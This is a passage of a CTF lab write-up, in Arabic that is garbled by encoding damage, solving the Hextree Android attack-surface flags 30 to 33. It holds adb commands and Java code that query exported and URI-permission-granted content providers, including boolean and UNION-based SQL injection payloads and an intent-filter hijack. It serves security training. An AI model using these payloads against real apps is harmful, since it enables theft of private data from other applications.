ÿßŸÑŸÑŸä ÿπÿßŸäÿ≤ ÿ™ÿ±ÿ¨ÿπŸáÿß (projection) \u0026#34;name=? AND visible=1\u0026#34;, // ÿ¥ÿ±ÿ∑ WHERE (ŸÅŸÑÿ™ÿ±) new String[]{\u0026#34;flag30\u0026#34;}, // ŸÇŸäŸÖ ÿßŸÑÿ¥ÿ±ÿ∑ (ÿ®ÿ™ÿ≠ŸÑ ŸÖÿ≠ŸÑ \u0026#39;?\u0026#39;) null, null, str2 // GroupBy, Having, SortOrder ); query.setNotificationUri(getContext().getContentResolver(), uri); success(logHelper); return query; } } ŸÑŸÖÿß ŸÜÿ®ÿπÿ™ URI ÿπÿ¥ÿßŸÜ ŸÜÿπŸÖŸÑ queryÿå ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÄ path ŸáŸà /success ŸàŸäÿ±ÿ¨ÿπ entries ÿßŸÑŸÑŸä ŸÑŸäŸáÿß name flag30 ŸàŸáŸä visible=1 ŸäÿπŸÜŸä ÿßŸÑŸÄ SQL query ÿ®ÿ™ÿ®ŸÇŸâ ÿ¥ŸÉŸÑŸáÿß ŸÉÿØŸá:\nSELECT [strArr columns...] FROM flag_table WHERE name = \u0026#39;flag30\u0026#39; AND visible = 1 ORDER BY [str2]; ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÄ authority ÿßŸÑŸÖÿπÿ±ŸÅ ŸÅŸä ÿßŸÑŸÄ xmlÿå ÿßŸÑŸÄ URI ŸáŸäÿ®ŸÇŸâ content://io.hextree.flag30/success\nÿßŸÑÿ≠ŸÑ # ŸÅŸä ÿ•ÿµÿØÿßÿ±ÿßÿ™ Android ÿßŸÑÿ≠ÿØŸäÿ´ÿ© ÿπÿ¥ÿßŸÜ ÿ™ÿπÿßŸÖŸÑ ŸÖÿπ provider ŸÑÿßÿ≤ŸÖ ÿ™ÿ≠ÿØÿØ package ÿßŸÑŸÄ ÿ™ÿ∑ÿ®ŸäŸÇ ÿßŸÑ ŸÅŸäŸá provider ÿßŸÑŸÑŸä ÿπÿßŸäÿ≤ ÿ™ÿπŸÖŸÑŸá query\n\u0026lt;queries\u0026gt; \u0026lt;package android:name=\u0026#34;io.hextree.attacksurface\u0026#34; /\u0026gt; \u0026lt;/queries\u0026gt; ADB:\nadb shell content query --uri content://io.hextree.flag30/success ÿßŸÑŸÜÿßÿ™ÿ¨: Row: 0 _id=1, name=flag30, value=HXT{XXXX-YYYYY-ZZZZ-c}, visible=1\njava:\nUri uri = Uri.parse(\u0026#34;content://io.hextree.flag30/success\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); // ÿßŸÑŸÜÿ™Ÿäÿ¨ÿ© Ÿáÿ™ÿ™ÿ≥ÿ¨ŸÑ } while (cursor.moveToNext()); } ÿßŸÑŸÉŸàÿØ ÿØŸá ÿ®Ÿäÿ∑ŸÑÿ® ŸÖŸÜ app ÿ™ÿßŸÜŸä (io.hextree.flag30) ÿ®ŸäÿßŸÜÿßÿ™ ŸÖÿÆŸÅŸäÿ© ŸàŸäŸÇÿ±ÿ£ ŸÉŸÑ ÿßŸÑÿµŸÅŸàŸÅ ŸàÿßŸÑÿ£ÿπŸÖÿØÿ© ŸÖŸÜ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ®ÿ™ÿßÿπÿ™Ÿá ŸàŸäÿ≥ÿ¨ŸÑ ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨.\nFlag 31 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag31Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag31\u0026#34;/\u0026gt; public class Flag31Provider extends ContentProvider { public static final String AUTHORITY = \u0026#34;io.hextree.flag31\u0026#34;; private static final int FLAGS = 1; private static final int FLAG_ID = 2; static { UriMatcher uriMatcher2 = new UriMatcher(-1); uriMatcher = uriMatcher2; uriMatcher2.addURI(AUTHORITY, \u0026#34;flags\u0026#34;, 1); uriMatcher2.addURI(AUTHORITY, \u0026#34;flag/#\u0026#34;, 2); } @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { StringBuilder append = new StringBuilder(\u0026#34;Flag31Provider.query(\u0026#39;\u0026#34;).append(uri.getPath()).append(\u0026#34;\u0026#39;): \u0026#34;); UriMatcher uriMatcher2 = uriMatcher; SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase(); int match = uriMatcher2.match(uri); if (match == 1) { throw new IllegalArgumentException(\u0026#34;FLAGS ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ ŸÑÿ≥Ÿá: \u0026#34; + uri); } if (match == 2) { long parseId = ContentUris.parseId(uri); Log.i(\u0026#34;Flag31\u0026#34;, \u0026#34;FLAG_ID: \u0026#34; + parseId); if (parseId == 31) { LogHelper logHelper = new LogHelper(getContext()); logHelper.addTag(uri.getPath()); success(logHelper); } return readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, \u0026#34;name=? AND visible=1\u0026#34;, new String[]{\u0026#34;flag\u0026#34; + parseId}, null, null, str2); } } } ÿßŸÑŸÄ provider ÿ®Ÿäÿ≠ÿØÿØ ŸÜŸàÿπŸäŸÜ ŸÖŸÜ ÿ£ŸÜŸÖÿßÿ∑ URI:\ncontent://io.hextree.flag31/flags ‚Üí Ÿäÿ∑ÿßÿ®ŸÇ FLAGS (ŸÉŸàÿØ 1) content://io.hextree.flag31/flag/# ‚Üí Ÿäÿ∑ÿßÿ®ŸÇ FLAG_ID (ŸÉŸàÿØ 2)ÿå ÿ≠Ÿäÿ´ # ŸáŸà ÿ±ŸÇŸÖ ÿ™ÿπÿ±ŸäŸÅ ŸäÿπŸÜŸä ŸÑŸà ÿØÿÆŸÑŸÜÿß idÿå ÿßŸÑŸÖÿ∑ÿßÿ®ŸÇÿ© ÿßŸÑÿ´ÿßŸÜŸäÿ© Ÿáÿ™ÿ¥ÿ™ÿ∫ŸÑ ŸÑŸà ŸÉÿßŸÜ 31 ŸÅÿßŸÑŸÄ Uri ŸáŸäÿ®ŸÇŸâ ÿ¥ŸÉŸÑŸá ŸÉÿØŸá content://io.hextree.flag31/flag/31\nÿßŸÑÿ≠ŸÑ # ADB:\nadb shell content query --uri content://io.hextree.flag31/flag/31 ÿßŸÑŸÜÿßÿ™ÿ¨: Row: 0 _id=2, name=flag31, value=HXT{1111-qqqqqq-xxxxx-zzzz}, visible=1\nJava\nUri uri = Uri.parse(\u0026#34;content://io.hextree.flag31/flag/31\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } Flag 32 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag32Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag32\u0026#34; /\u0026gt; ŸÜŸÇÿØÿ± ŸÜŸÇÿ≥ŸÖ ŸÉŸÑÿßÿ≥ ÿßŸÑŸÄ provider ÿØŸá ŸÑÿ£ÿ¨ÿ≤ÿßÿ° ÿπÿ¥ÿßŸÜ ŸÜŸÇÿØÿ± ŸÜŸÇÿ±ÿßŸá ÿ£ÿ≥ŸáŸÑ\n1. ÿßÿ≥ÿ™ÿπŸÑÿßŸÖ Flag ŸÅÿ±ÿØŸä (Match == 2) # if (match == 2) { // ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ ID ŸÖŸÜ URI (ŸÖÿ´ŸÑÿßŸãÿå content://.../flag/32 ‚Üí ID=32) long parseId = ContentUris.parseId(uri); Log.i(\u0026#34;Flag32\u0026#34;, \u0026#34;FLAG_ID: \u0026#34; + parseId); // ÿßÿ≥ÿ™ÿπŸÑÿßŸÖ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÑŸÄ flag ŸÖÿ≠ÿØÿØ return readableDatabase.query( FlagDatabaseHelper.TABLE_FLAG, // ÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸàŸÑ strArr, // ÿßŸÑÿ£ÿπŸÖÿØÿ© ÿßŸÑŸÖÿ±ÿ¨ÿπÿ© \u0026#34;name=? AND visible=1\u0026#34;, // flags ÿßŸÑÿ∏ÿßŸáÿ±ÿ© ŸÅŸÇÿ∑ ŸÖÿπ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸÖÿ∑ÿßÿ®ŸÇ new String[]{\u0026#34;flag\u0026#34; + parseId},// ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ \u0026#34;flag32\u0026#34; ÿ•ÿ∞ÿß ŸÉÿßŸÜ ID=32 null, null, str2 // GroupBy, Having, OrderBy ); } ÿ®Ÿäÿ™ÿπÿßŸÖŸÑ ŸÖÿπ URIs ÿ≤Ÿä content://provider/flag/32 ŸÑŸÖÿß ÿ®Ÿäÿ≥ÿ™ÿÆÿ±ÿ¨ ÿßŸÑÿ±ŸÇŸÖ (32) ŸàŸäÿØŸàÿ± ÿπŸÑŸâ flag32 ÿ®Ÿäÿ±ÿ¨ÿπ ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨ ŸÅŸÇÿ∑ ŸÑŸÖÿß visible=1 (ÿßŸÑŸÄ flags ÿßŸÑŸÖÿÆŸÅŸäÿ© ŸÖÿ¥ Ÿáÿ™ÿ∏Ÿáÿ±)\n2. ÿßÿ≥ÿ™ÿπŸÑÿßŸÖ Flags ÿπÿßŸÖ (Match == 1) # String str3 = \u0026#34;visible=1\u0026#34; + (str != null ? \u0026#34; AND (\u0026#34; + str + \u0026#34;)\u0026#34; : \u0026#34;\u0026#34;); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2); if (containsFlag32(query)) { success(logHelper); query.requery(); } return query; ÿØŸá ÿßŸÅÿ™ÿ±ÿßÿ∂ŸäÿßŸã ÿ®Ÿäÿ∏Ÿáÿ± ŸÉŸÑ ÿßŸÑŸÄ flags ÿ≠Ÿäÿ´ visible=1 ŸàŸÜŸÇÿØÿ± ŸÜÿ∂ŸäŸÅ ŸÅŸÑÿßÿ™ÿ± ÿ•ÿ∂ÿßŸÅŸäÿ© ŸÖŸÜ ÿÆŸÑÿßŸÑ ŸÖÿπÿßŸÖŸÑ str ŸàŸÉŸÖÿßŸÜ ÿπŸÜÿØŸá ŸÖÿπÿßŸÑÿ¨ÿ© ÿÆÿßÿµÿ© ŸÑŸÄ flag32 ÿßŸÑŸÑŸä ÿ®ÿ™ÿ¥ÿ∫ŸÑ success\n3. ŸÅÿßÿ≠ÿµ Flag32 # public boolean containsFlag32(Cursor cursor) { if (cursor == null) { return false; } int columnIndex = cursor.getColumnIndex(FlagDatabaseHelper.COLUMN_NAME); while (cursor.moveToNext()) { if (\u0026#34;flag32\u0026#34;.equals(cursor.getString(columnIndex))) { return true; } } return false; } ÿ®Ÿäÿ≥ŸÉÿßŸÜ ŸÜÿ™ÿßÿ¶ÿ¨ ÿßŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖ ŸÑÿ£Ÿä ÿµŸÅ ÿßÿ≥ŸÖŸá \u0026ldquo;flag32\u0026rdquo; ŸàŸäÿ±ÿ¨ÿπ true ŸÅŸÇÿ∑ ÿ•ÿ∞ÿß flag32 ŸÖŸàÿ¨ŸàÿØ Ÿàÿ∏ÿßŸáÿ±\nÿ®ÿßÿÆÿ™ÿµÿßÿ±:\nÿØŸá ŸÉŸÖÿßŸÜ ÿ®Ÿäÿ≠ÿØÿØ ŸÜŸÅÿ≥ matchers ŸÖŸÜ ÿßŸÑŸÄ flags ÿßŸÑŸÑŸä ŸÅÿßÿ™ÿ™. method ÿßŸÑŸÄ query() ŸÜŸÇÿØÿ± ŸÜŸÖÿ¥Ÿä ŸÅŸäŸá ÿ®ÿ∑ÿ±ŸäŸÇÿ™ŸäŸÜ:\nŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖÿßÿ™ Flag ŸÅÿ±ÿØŸäÿ© (FLAG_ID, match == 2)\nÿ®ÿßÿ≥ÿ™ÿÆÿ±ÿßÿ¨ ÿßŸÑŸÄ ID ŸÖŸÜ ÿßŸÑŸÄ URI (ŸÖÿ´ŸÑÿßŸãÿå /flag/32 ‚Üí ID 32) ŸàÿßŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖ ÿπŸÜŸá ŸÖÿπ visible=1 ŸàŸäÿ±ÿ¨ÿπ ÿ•ÿ∞ÿß ŸÑŸÇŸâ ŸÖÿ∑ÿßÿ®ŸÇÿ© ŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖ Flags ÿπÿßŸÖ (FLAGS, match == 1)\nÿ•ŸÜÿ¥ÿßÿ° query ŸÖÿπ visible=1 ÿ´ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿ£Ÿä ŸÖÿπÿßŸäŸäÿ± ÿßÿÆÿ™Ÿäÿßÿ± ÿ•ÿ∂ÿßŸÅŸäÿ© ÿ•ÿ∞ÿß ÿ™ŸàŸÅÿ±ÿ™ Ÿàÿ®ÿπÿØ ÿ™ŸÜŸÅŸäÿ∞ ÿßŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖÿå ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ÿ∞ÿß ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨ ŸÅŸäŸá \u0026ldquo;flag32\u0026rdquo; ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ containsFlag32() ÿ•ÿ∞ÿß ŸÑŸÇÿßŸá ÿ®Ÿäÿ¥ÿ∫ŸÑ success ÿ®ÿ™ÿßÿπŸÜÿß ÿßŸÑÿ≠ŸÑ # ÿßŸÑŸÖŸÅÿ™ÿßÿ≠ ŸÅŸä ÿßŸÑÿ¨ÿ≤ÿ° ÿßŸÑÿ´ÿßŸÜŸä ŸÑÿ£ŸÜŸá ÿ®Ÿäÿ®ŸÜŸä ÿßŸÑŸÅŸÑÿßÿ™ÿ± ŸÑŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖ (sql query) ŸàŸäÿßÿÆÿØ input ŸÖÿ®ÿßÿ¥ÿ±ÿ© ŸàÿØŸá ÿ®ŸäÿÆŸÑŸäŸá ÿπÿ±ÿ∂ÿ© ŸÑŸÄ sql injection (Boolean based sql injection)\nString str3 = \u0026#34;visible=1\u0026#34; + (str != null ? \u0026#34; AND (\u0026#34; + str + \u0026#34;)\u0026#34; : \u0026#34;\u0026#34;); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str3, strArr2, null, null, str2); if (containsFlag32(query)) { success(logHelper); query.requery(); } return query; ŸäÿπŸÜŸä\nvisible=1 AND ( ÿ£Ÿä ÿ≠ÿßÿ¨ÿ©) --ÿßŸÑÿ£ÿµŸÑŸä visible=1 AND (1=1) OR (1=1) --ÿ¥ŸÉŸÑ ÿßŸÑŸÄ payload ÿ®ÿ™ÿßÿπŸÜÿß Uri uri = Uri.parse(\u0026#34;content://io.hextree.flag32/flags\u0026#34;); Cursor cursor = getContentResolver().query(uri, null, \u0026#34;1=1) OR (1=1\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } Flag 33_1 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag33Provider1\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.flag33_1\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;/\u0026gt; ŸáŸÜÿß ŸÖŸÇÿØÿ±ÿ¥ ÿ£ÿπŸÖŸÑŸá query ŸÖÿ®ÿßÿ¥ÿ±ÿ© ÿ®ÿ≥ ÿπŸÜÿØŸä URI permission ÿßŸÑŸÑŸä ÿ®ÿ™ÿØŸä permission ŸÖÿ§ŸÇÿ™ ŸÑŸÄ URIs ŸÖÿ≠ÿØÿØÿ©ÿå ÿ≠ÿ™Ÿâ ŸÑŸà ÿßŸÑŸÑŸä ÿ®Ÿäÿ∑ŸÑÿ® ŸÖÿ¥ ÿπŸÜÿØŸá ÿµŸÑÿßÿ≠Ÿäÿ© ÿπÿßÿØÿ©.\nvoid prepareDB(LogHelper logHelper) { ContentValues contentValues = new ContentValues(); contentValues.put(FlagDatabaseHelper.COLUMN_CONTENT, logHelper.appendLog(Flag33Activity1.FLAG)); this.dbHelper.getReadableDatabase().update(FlagDatabaseHelper.TABLE_NOTE, contentValues, \u0026#34;title=?\u0026#34;, new String[]{\u0026#34;flag33\u0026#34;}); } public boolean containsFlag33(Cursor cursor) { if (cursor == null) { return false; } boolean z = false; while (cursor.moveToNext()) { int i = 0; while (true) { if (i \u0026gt;= cursor.getColumnCount()) { break; } if (\u0026#34;flag33\u0026#34;.equals(cursor.getString(i))) { z = true; break; } i++; } } return z; } ÿßŸÑŸÄ prepareDB() ÿ®ŸäÿßÿÆÿØ ÿßŸÑŸÄ flag ÿßŸÑÿ≠ŸÇŸäŸÇŸä (ŸÖŸÜ Flag33Activity1) ŸàŸäÿ≠ÿØÿ´ entry ÿßŸÑŸÄ flag33 ŸÅŸä ÿ¨ÿØŸàŸÑ Note ÿ®ŸäŸá ÿ®ÿ≥ ŸäÿÆŸÑŸä ÿ¨ÿØŸàŸÑ Note ÿ±ÿ≥ŸÖŸäÿßŸã \u0026ldquo;ŸÖŸÇŸÅŸàŸÑ\u0026rdquo; ŸÑŸÑÿßÿ≥ÿ™ÿπŸÑÿßŸÖÿßÿ™ÿü! ŸàÿßŸÑŸÄ containsFlag33 ÿ®Ÿäÿ®ÿµ ŸÅŸä ŸÉŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑŸÖÿ±ÿ¨ÿπÿ© ŸÑŸà ŸÑŸÇŸâ \u0026ldquo;flag33\u0026rdquo; ŸÅŸä ÿ£Ÿä ÿ≠ÿ™ÿ©ÿå ÿ®Ÿäÿ±ÿ¨ÿπ true\npublic static final String AUTHORITY = \u0026#34;io.hextree.flag33_1\u0026#34;; private static final int FLAGS = 1; private static final int NOTES = 2; static { UriMatcher uriMatcher2 = new UriMatcher(-1); uriMatcher = uriMatcher2; uriMatcher2.addURI(AUTHORITY, \u0026#34;flags\u0026#34;, 1); uriMatcher2.addURI(AUTHORITY, \u0026#34;notes\u0026#34;, 2); } @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { StringBuilder append = new StringBuilder(\u0026#34;Flag33Provider1.query(\u0026#39;\u0026#34;).append(uri.getPath()).append(\u0026#34;\u0026#39;): \u0026#34;); UriMatcher uriMatcher2 = uriMatcher; Log.i(\u0026#34;Flag33Provider1\u0026#34;, append.append(uriMatcher2.match(uri)).toString()); SQLiteDatabase readableDatabase = this.dbHelper.getReadableDatabase(); int match = uriMatcher2.match(uri); if (match != 1) { if (match == 2) { throw new IllegalArgumentException(\u0026#34;ÿßŸÑŸàÿµŸàŸÑ ŸÑÿ¨ÿØŸàŸÑ Notes ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑ ŸÑÿ≥Ÿá\u0026#34;); } throw new IllegalArgumentException(\u0026#34;URI ŸÖÿ¥ ŸÖÿπÿ±ŸàŸÅ: \u0026#34; + uri); } prepareDB(logHelper); Cursor query = readableDatabase.query(FlagDatabaseHelper.TABLE_FLAG, strArr, str, strArr2, null, null, str2); if (containsFlag33(query)) { success(logHelper); } ÿØŸÑŸàŸÇÿ™Ÿä ÿπŸÜÿØŸÜÿß 2 ÿ∑ÿ±ŸÇ ŸÜŸÇÿØÿ± ŸÜŸÖÿ¥Ÿä ŸÅŸäŸáŸÖ:\nŸÑŸà ÿ∑ŸÑÿ®ÿ™ \u0026ldquo;flags\u0026rdquo; (path /flags)ÿå Ÿáÿ™ÿ±Ÿàÿ≠ ŸÑÿ¨ÿØŸàŸÑ flags Ÿàÿ™ÿ¥ŸàŸÅ ŸÖÿ≠ÿ™ŸàÿßŸá ŸÑŸà ÿ∑ŸÑÿ®ÿ™ \u0026ldquo;notes\u0026rdquo; (path /notes)ÿå Ÿáÿ™ÿ±Ÿàÿ≠ ŸÑŸÇÿ≥ŸÖ 2 (ÿ®ÿ≥ ÿØŸá ŸÖŸÇŸÅŸàŸÑ ŸàŸÖÿ¥ ŸÖÿ™ÿßÿ≠ ÿ±ÿ≥ŸÖŸäÿßŸã) Ÿàÿ®ÿπÿØŸäŸÜ ÿ®ÿßŸÇŸä ÿßŸÑŸÉŸàÿØ ÿ®Ÿäÿ¥ŸäŸÉ ÿ•ŸäŸá ÿßŸÑŸÑŸä ÿ®ÿ™ÿ∑ŸÑÿ®Ÿá (flags ŸÅŸÇÿ∑) ŸäÿπŸÜŸä (match !=1) ÿ´ŸÖ Ÿäÿ¥ÿ∫ŸÑ prepareDB() (ÿßŸÑŸÑŸä ÿ≤Ÿä ŸÖÿß ÿ¥ÿ±ÿ≠ŸÜÿß ŸÅŸàŸÇ) Ÿäÿ≠ÿ∂ÿ± ÿ¨ÿØŸàŸÑ notes ŸàŸäÿ¥ÿ∫ŸÑ ÿßŸÑŸÄ query ÿ®ÿ™ÿßÿπŸÉ ÿπŸÑŸâ ÿ¨ÿØŸàŸÑ Flag ŸÑŸà ŸÑŸÇŸâ \u0026ldquo;flag33\u0026rdquo; ŸÅŸä ÿßŸÑŸÜÿ™ÿßÿ¶ÿ¨ÿå ÿ®Ÿäÿ¥ÿ∫ŸÑ success\nÿØŸÑŸàŸÇÿ™Ÿä ÿ•ÿ≤ÿßŸä ŸÜÿ™ŸÉŸÑŸÖ ŸÖÿπÿßŸáÿü ÿ®ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ activity 31_1\nIntent intent = getIntent(); String stringExtra = intent.getStringExtra(\u0026#34;secret\u0026#34;); if (stringExtra == null) { if (intent.getAction() == null || !intent.getAction().equals(\u0026#34;io.hextree.FLAG33\u0026#34;)) { return; } intent.setData(Uri.parse(\u0026#34;content://io.hextree.flag33_1/flags\u0026#34;)); intent.addFlags(1); setResult(-1, intent); finish(); return; } if (Flag33Provider1.secret.equals(stringExtra)) { this.f = new LogHelper(this); this.f.addTag(\u0026#34;access-notes-table\u0026#34;); this.f.addTag(\u0026#34;flag33\u0026#34;); checkStatus(this); } } ÿ®Ÿäÿ≥ÿ™ŸÑŸÖ intent ŸàŸÑŸà ŸÑŸäŸá action \u0026quot;io.hextree.FLAG33\u0026quot; ŸàÿßŸÑŸÄ extra string ÿ®ŸÄ null ÿ®Ÿäÿ∂ÿ®ÿ∑ ÿßŸÑŸÄ Uri ÿ®ŸÄ \u0026quot;content://io.hextree.flag33_1/flags\u0026quot; Ÿàflag 1 ÿßŸÑŸÑŸä ŸáŸà FLAG_GRANT_READ_URI_PERMISSION\nÿßŸÑÿ≠ŸÑ # ŸäÿπŸÜŸä ÿ•ŸäŸá ÿßŸÑŸÑŸä ŸÜŸÇÿØÿ± ŸÜÿπŸÖŸÑŸáÿü ŸÜŸÇÿØÿ± ŸÜÿ®ÿπÿ™ intent ÿ®ŸÄ startActivityForResult ŸàŸÜÿ≥ÿ™ÿÆÿØŸÖ SQLi injection ÿ®ÿ≥ ÿßŸÑŸÖÿ±ÿ© ÿØŸä ÿßÿ≥ŸÖŸáÿß union attack ŸÑÿ£ŸÜŸÜÿß ÿπÿßŸäÿ≤ŸäŸÜ ŸÜŸàÿµŸÑ ŸÑÿ¨ÿØÿßŸàŸÑ ÿ™ÿßŸÜŸäÿ© ŸÖŸÜ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ÿå ŸàŸÜÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑŸÄ cursor ÿ®ÿ™ÿßÿπŸÜÿß ÿπÿ¥ÿßŸÜ ŸÜÿ¨Ÿäÿ® ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸàŸÜÿ≥ÿ¨ŸÑŸáÿß\nIntent intent = new Intent(\u0026#34;io.hextree.FLAG33\u0026#34;); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag33Activity1\u0026#34;)); startActivityForResult(intent,0); @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == 0) { Log.d(\u0026#34;flags\u0026#34;, data.getData().toString()); // where _id=2 union Select Cursor cursor = getContentResolver().query(data.getData(), new String[]{\u0026#34;name\u0026#34;, \u0026#34;value\u0026#34;,\u0026#34;visible\u0026#34;}, \u0026#34;_id = 2 UNION SELECT * FROM Note\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } } } Flag 33_2 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag33Provider2\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;false\u0026#34; android:authorities=\u0026#34;io.hextree.flag33_2\u0026#34; android:grantUriPermissions=\u0026#34;true\u0026#34;/\u0026gt; ÿ≤Ÿä ÿßŸÑŸÄ flag ÿßŸÑŸÑŸä ŸÅÿßÿ™ ŸÖŸÇÿØÿ±ÿ¥ ÿ£ŸàÿµŸÑŸá ÿ®ÿ≥ component ÿ™ÿßŸÜŸä ŸÖÿπ ÿßŸÑÿ∑ŸÑÿ®ÿßÿ™ ÿßŸÑÿµÿ≠ ŸäŸÇÿØÿ± ŸäŸàÿµŸÑŸá Ÿàÿ®ÿµÿ© ÿπŸÑŸâ activity33_2 ÿπŸÜÿØŸá ÿßŸÑŸÖÿ™ÿ∑ŸÑÿ®ÿßÿ™ ÿßŸÑÿµÿ≠\nString stringExtra = getIntent().getStringExtra(\u0026#34;secret\u0026#34;); if (stringExtra == null) { Intent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.FLAG33\u0026#34;); intent.setData(Uri.parse(\u0026#34;content://io.hextree.flag33_2/flags\u0026#34;)); intent.addFlags(1); startActivity(intent); return; } ÿØŸá ÿ®ŸäÿπŸÖŸÑ implicit intent ŸÖÿπ action \u0026quot;io.hextree.FLAG33\u0026quot; Ÿàdata ŸÑŸÑŸÄ provider ÿßŸÑÿ´ÿßŸÜŸä\nÿßŸÑÿ≠ŸÑ # ŸÜŸÅÿ≥ ÿßŸÑŸÄ payload ÿ®ÿ™ÿßÿπ flag33_1 ÿ®ÿ≥ ŸáŸÜÿπŸÖŸÑ filter ŸÑŸÑŸÄ action\n\u0026lt;activity android:name=\u0026#34;.Providers\u0026#34; android:exported=\u0026#34;true\u0026#34; \u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;io.hextree.FLAG33\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34; android:host=\u0026#34;io.hextree.flag33_2\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent intent_33 = getIntent(); if (intent_33.getAction() != null \u0026amp; \u0026#34;io.hextree.FLAG33\u0026#34;.equals(getIntent().getAction())) { Cursor cursor = getContentResolver().query(intent_33.getData(), new String[]{\u0026#34;name\u0026#34;, \u0026#34;value\u0026#34;, \u0026#34;visible\u0026#34;}, \u0026#34;_id = 2 UNION SELECT * FROM Note\u0026#34;, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; cursor.getColumnCount(); i++) { if (sb.length() \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;); sb.append(cursor.getColumnName(i)).append(\u0026#34; = \u0026#34;).append(cursor.getString(i)); } Log.d(\u0026#34;evil\u0026#34;, sb.toString()); } while (cursor.moveToNext()); } } Flag 